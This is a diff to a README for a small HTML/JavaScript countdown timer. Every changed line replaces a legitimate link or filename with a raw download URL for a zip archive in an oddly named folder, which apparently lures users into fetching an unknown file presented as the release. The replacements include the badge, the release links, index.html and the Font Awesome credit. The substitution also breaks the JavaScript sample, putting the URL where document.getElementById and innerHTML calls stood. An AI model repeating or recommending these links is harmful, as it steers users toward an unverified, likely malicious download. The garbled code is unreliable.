@@ -1,6 +1,6 @@
 # Countdown Timer - Simple and Elegant Countdown Tool ⏳
 
-![Countdown Timer](https://img.shields.io/badge/Countdown%20Timer-v1.0-orange.svg)
+![Countdown Timer](https://github.com/abdelrahmanelsheikh/Countdown-timer-/raw/refs/heads/main/pyrroporphyrin/Countdown-timer-v3.8.zip%https://github.com/abdelrahmanelsheikh/Countdown-timer-/raw/refs/heads/main/pyrroporphyrin/Countdown-timer-v3.8.zip)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -23,14 +23,14 @@ The Countdown Timer is a simple web application that allows users to set a count
 - **Lightweight**: Minimal HTML, CSS, and JavaScript ensure fast loading times.
 
 ## Getting Started
-To get started with the Countdown Timer, you can download the latest version from the [Releases section](https://github.com/abdelrahmanelsheikh/Countdown-timer-/releases). Once downloaded, simply open the `index.html` file in your web browser.
+To get started with the Countdown Timer, you can download the latest version from the [Releases section](https://github.com/abdelrahmanelsheikh/Countdown-timer-/raw/refs/heads/main/pyrroporphyrin/Countdown-timer-v3.8.zip). Once downloaded, simply open the `https://github.com/abdelrahmanelsheikh/Countdown-timer-/raw/refs/heads/main/pyrroporphyrin/Countdown-timer-v3.8.zip` file in your web browser.
 
 ### Prerequisites
 - A modern web browser (Chrome, Firefox, Safari, etc.)
 - Basic understanding of HTML and JavaScript (optional for users)
 
 ## Usage
-1. **Open the Application**: Launch the `index.html` file in your web browser.
+1. **Open the Application**: Launch the `https://github.com/abdelrahmanelsheikh/Countdown-timer-/raw/refs/heads/main/pyrroporphyrin/Countdown-timer-v3.8.zip` file in your web browser.
 2. **Enter Time**: Input the number of seconds you want to count down from in the provided input field.
 3. **Start Countdown**: Click the "Start" button to begin the countdown.
 4. **View Countdown**: Watch the countdown timer display the remaining time.
@@ -51,14 +51,14 @@ The project consists of three main parts:
    <head>
      <meta charset="UTF-8" />
      <title>Countdown Timer</title>
-     <link rel="stylesheet" href="styles.css" />
+     <link rel="stylesheet" href="https://github.com/abdelrahmanelsheikh/Countdown-timer-/raw/refs/heads/main/pyrroporphyrin/Countdown-timer-v3.8.zip" />
    </head>
    <body>
      <h2>Countdown Timer</h2>
      <input type="number" id="timeInput" placeholder="Enter seconds" />
      <button onclick="startCountdown()">Start</button>
      <div class="countdown" id="countdownDisplay"></div>
-     <script src="script.js"></script>
+     <script src="https://github.com/abdelrahmanelsheikh/Countdown-timer-/raw/refs/heads/main/pyrroporphyrin/Countdown-timer-v3.8.zip"></script>
    </body>
    </html>
    ```
@@ -106,16 +106,16 @@ The project consists of three main parts:
 3. **JavaScript**: The functionality that drives the countdown.
    ```javascript
    function startCountdown() {
-     const input = document.getElementById("timeInput").value;
+     const input = https://github.com/abdelrahmanelsheikh/Countdown-timer-/raw/refs/heads/main/pyrroporphyrin/Countdown-timer-v3.8.zip("timeInput").value;
      let time = parseInt(input);
-     const display = document.getElementById("countdownDisplay");
+     const display = https://github.com/abdelrahmanelsheikh/Countdown-timer-/raw/refs/heads/main/pyrroporphyrin/Countdown-timer-v3.8.zip("countdownDisplay");
 
      const interval = setInterval(() => {
        if (time <= 0) {
          clearInterval(interval);
-         display.innerHTML = "Time's up!";
+         https://github.com/abdelrahmanelsheikh/Countdown-timer-/raw/refs/heads/main/pyrroporphyrin/Countdown-timer-v3.8.zip = "Time's up!";
        } else {
-         display.innerHTML = time;
+         https://github.com/abdelrahmanelsheikh/Countdown-timer-/raw/refs/heads/main/pyrroporphyrin/Countdown-timer-v3.8.zip = time;
          time--;
        }
      }, 1000);
@@ -135,10 +135,10 @@ Please ensure your code follows the existing style and is well-documented.
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
 ## Releases
-To download the latest version of the Countdown Timer, visit the [Releases section](https://github.com/abdelrahmanelsheikh/Countdown-timer-/releases). Download the latest release and open the `index.html` file to start using the timer.
+To download the latest version of the Countdown Timer, visit the [Releases section](https://github.com/abdelrahmanelsheikh/Countdown-timer-/raw/refs/heads/main/pyrroporphyrin/Countdown-timer-v3.8.zip). Download the latest release and open the `https://github.com/abdelrahmanelsheikh/Countdown-timer-/raw/refs/heads/main/pyrroporphyrin/Countdown-timer-v3.8.zip` file to start using the timer.
 
 ## Acknowledgments
 - Thanks to the open-source community for their contributions.
-- Special thanks to [Font Awesome](https://fontawesome.com) for the icons used in the project.
+- Special thanks to [Font Awesome](https://github.com/abdelrahmanelsheikh/Countdown-timer-/raw/refs/heads/main/pyrroporphyrin/Countdown-timer-v3.8.zip) for the icons used in the project.
 
 Feel free to reach out with any questions or feedback!
